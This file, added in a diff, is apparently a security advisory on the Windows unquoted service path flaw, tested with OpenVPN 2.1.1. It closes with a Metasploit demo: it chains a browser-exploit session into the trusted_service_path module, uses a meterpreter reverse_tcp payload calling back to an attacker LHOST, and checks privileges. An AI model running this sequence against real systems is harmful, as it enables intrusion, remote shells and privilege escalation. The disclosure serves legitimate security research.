@@ -1,0 +1,37 @@
+Blog : http://eromang.zataz.com
+Twitter : http://twitter.com/eromang
+
+Timeline :
+Metasploit PoC provided the 2012-08-14
+
+PoC provided by:
+sinn3r
+
+Reference(s) :
+None
+
+Affected versions :
+All Microsoft Windows with applications having unexpected paths
+
+Tested on Windows XP Pro SP3 with OpenVPN 2.1.1
+
+Description :
+This module exploits a logic flaw due to how the lpApplicationName parameter is handled. When the lpApplicationName contains a space, the file name is ambiguous. Take this file path as example: C:\program files\hello.exe; The Windows API will try to interpret this as two possible paths: C:\program.exe, and C:\program files\hello.exe, and then execute all of them. To some software developers, this is an unexpected behavior, which becomes a security problem if an attacker is able to place a malicious executable in one of these unexpected paths, sometimes escalate privileges if run as SYSTEM. Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the same problem. The offensive technique is also described in Writing Secure Code (2nd Edition), Chapter 23, in the section "Calling Processes Security" on page 676.
+
+Metasploit demo :
+
+You need a valid session on the target for example with :
+
+exploit/windows/browser/ms12_037_same_id
+
+Then execute the following exploit to detect vulnerable services
+
+use exploit/windows/local/trusted_service_path
+set SESSION 2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.178.100
+set LPORT 4443
+exploit
+
+sysinfo
+getuid
